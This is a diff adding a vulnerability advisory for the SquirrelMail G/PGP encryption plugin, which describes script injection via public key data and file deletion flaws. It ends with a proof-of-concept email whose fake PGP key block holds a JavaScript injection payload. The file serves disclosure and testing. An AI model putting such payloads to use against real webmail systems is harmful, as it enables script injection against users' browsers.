@@ -1,0 +1,33 @@
+source: http://www.securityfocus.com/bid/26788/info
+
+The G/PGP encryption plugin for SquirrelMail is prone to an input-validation vulnerability and an access-validation vulnerability.
+
+Attackers can exploit these issues to inject arbitrary script code into public key data or to delete and overwrite arbitrary files with the privileges of the application.
+
+SquirrelMail G/PGP Encryption Plugin 2.0, 2.0.1, and 2.1 are vulnerable; other versions may also be affected.
+
+NOTE: One or more of these issues may already have been documented in the following BIDs, but we don't have enough information at this time to distinguish among them:
+
+- 24782, SquirrelMail G/PGP Encryption Plug-in Unspecified Remote Command Execution Vulnerability
+- 24828, SquirrelMail G/PGP Encryption Plug-in Multiple Unspecified Remote Command Execution Vulnerabilities
+- 24874, SquirrelMail G/PGP Encryption Plug-in Multiple Remote Command Execution
+Vulnerabilities
+
+Message-ID: <50453.10.0.0.1.1192345884.squirrel@mail.example.org>
+Date: Sun, 14 Oct 2007 10:11:24 +0300 (EEST)
+Subject: Test mail with SquirrelMail GPG 2.1 POC exploit
+From: test@example.org
+
+Test mail with SquirrelMail GPG 2.1 JavaScript exploit
+
+-----BEGIN PGP PUBLIC KEY BLOCK-----
+Version: GnuPG v1.4.6 (GNU/Linux)
+
+"><script language="JavaScript">
+<!--
+alert("unsanitized javascript")
+-->
+</script>
+<input type="hidden" name="hideout" value="
+-----END PGP PUBLIC KEY BLOCK-----
+
